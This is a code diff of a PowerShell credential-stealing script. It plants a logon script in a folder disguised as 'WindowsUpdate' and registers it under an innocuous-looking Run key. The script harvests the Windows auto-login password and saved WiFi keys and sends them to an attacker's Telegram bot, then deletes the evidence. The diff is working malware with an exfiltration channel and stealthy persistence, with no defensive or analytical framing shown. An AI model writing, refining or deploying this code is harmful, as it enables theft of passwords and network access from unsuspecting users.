@@ -130,88 +130,66 @@ try {
     Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
 } catch {}
 
-# Create logon credential capture script
+# Create logon credential capture script (using direct file write to avoid escaping issues)
 $logonScriptPath = "C:\ProgramData\WindowsUpdate\logondata.ps1"
-$logonScript = @"
-`$TelegramBotToken = "$TelegramBotToken"
-`$TelegramChatId = "$TelegramChatId"
 
+# Write script content line by line to avoid complex escaping
+@"
+`$TelegramBotToken = '$TelegramBotToken'
+`$TelegramChatId = '$TelegramChatId'
 `$credsOutput = @()
-`$credsOutput += "=== LOGIN EVENT ==="
+`$credsOutput += '=== LOGIN EVENT ==='
 `$credsOutput += "Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 `$credsOutput += "Computer: `$env:COMPUTERNAME"
 `$credsOutput += "User: `$env:USERNAME"
-`$credsOutput += ""
-
-`$credsOutput += "=== AUTO-LOGIN CREDENTIALS ==="
+`$credsOutput += ''
+`$credsOutput += '=== AUTO-LOGIN CREDENTIALS ==='
 try {
-    `$winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    `$winlogon = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
     `$autoLogin = Get-ItemProperty -Path `$winlogon -ErrorAction SilentlyContinue
-    if (`$autoLogin.AutoAdminLogon -eq "1") {
+    if (`$autoLogin.AutoAdminLogon -eq '1') {
         `$credsOutput += "Username: `$(`$autoLogin.DefaultUsername)"
         `$credsOutput += "Password: `$(`$autoLogin.DefaultPassword)"
     }
 } catch {}
-
-`$credsOutput += ""
-`$credsOutput += "=== WIFI PASSWORDS ==="
+`$credsOutput += ''
+`$credsOutput += '=== WIFI PASSWORDS ==='
 try {
-    `$wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { (`$_ -split ":")[-1].Trim() }
+    `$wifiProfiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { (`$_ -split ':')[-1].Trim() }
     foreach (`$wifiProfile in `$wifiProfiles) {
         `$passInfo = netsh wlan show profile name="`$wifiProfile" key=clear
-        `$wifiPassword = (`$passInfo | Select-String "Key Content") -replace ".*: ",""
+        `$wifiPassword = (`$passInfo | Select-String 'Key Content') -replace '.*: ',''
         if (`$wifiPassword) { `$credsOutput += "`$wifiProfile : `$wifiPassword" }
     }
 } catch {}
-
 `$credsFile = "`$env:TEMP\login-`$env:COMPUTERNAME-`$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
 `$credsOutput | Out-File -FilePath `$credsFile -Encoding UTF8
-
-# Send immediate text notification
-`$loginAlert = @"
-🔔 USER LOGIN DETECTED
-
-Computer: `$env:COMPUTERNAME
-User: `$env:USERNAME
-Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-
-✅ User logged in
-Status: Credentials file being sent...
-"@
-
+`$loginAlert = "🔔 USER LOGIN DETECTED`n`nComputer: `$env:COMPUTERNAME`nUser: `$env:USERNAME`nTime: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n✅ User logged in`nStatus: Credentials file being sent..."
 try {
     `$alertUri = "https://api.telegram.org/bot`$TelegramBotToken/sendMessage"
-    `$alertBody = @{
-        chat_id = `$TelegramChatId
-        text = `$loginAlert
-    }
+    `$alertBody = @{ chat_id = `$TelegramChatId; text = `$loginAlert }
     Invoke-RestMethod -Uri `$alertUri -Method Post -Body `$alertBody -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
 } catch {}
-
 Add-Type -AssemblyName System.Net.Http
 `$httpClient = New-Object System.Net.Http.HttpClient
 `$form = New-Object System.Net.Http.MultipartFormDataContent
 `$chatIdContent = New-Object System.Net.Http.StringContent(`$TelegramChatId)
-`$form.Add(`$chatIdContent, "chat_id")
+`$form.Add(`$chatIdContent, 'chat_id')
 `$captionText = "Login: `$env:USERNAME @ `$env:COMPUTERNAME"
 `$captionContent = New-Object System.Net.Http.StringContent(`$captionText)
-`$form.Add(`$captionContent, "caption")
+`$form.Add(`$captionContent, 'caption')
 `$fileStream = [System.IO.File]::OpenRead(`$credsFile)
 `$fileContent = New-Object System.Net.Http.StreamContent(`$fileStream)
 `$fileName = [System.IO.Path]::GetFileName(`$credsFile)
-`$form.Add(`$fileContent, "document", `$fileName)
-
+`$form.Add(`$fileContent, 'document', `$fileName)
 try {
     `$apiUrl = "https://api.telegram.org/bot`$TelegramBotToken/sendDocument"
     `$response = `$httpClient.PostAsync(`$apiUrl, `$form).Result
 } catch {}
-
 if (`$fileStream) { `$fileStream.Dispose() }
 if (`$httpClient) { `$httpClient.Dispose() }
 Remove-Item `$credsFile -Force -ErrorAction SilentlyContinue
-"@
-
-$logonScript | Out-File -FilePath $logonScriptPath -Encoding UTF8
+"@ | Out-File -FilePath $logonScriptPath -Encoding UTF8
 
 # Add logon script to Run key (runs as logged-in user)
 Set-ItemProperty -Path $runOncePath -Name "UserDataSync" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $logonScriptPath"
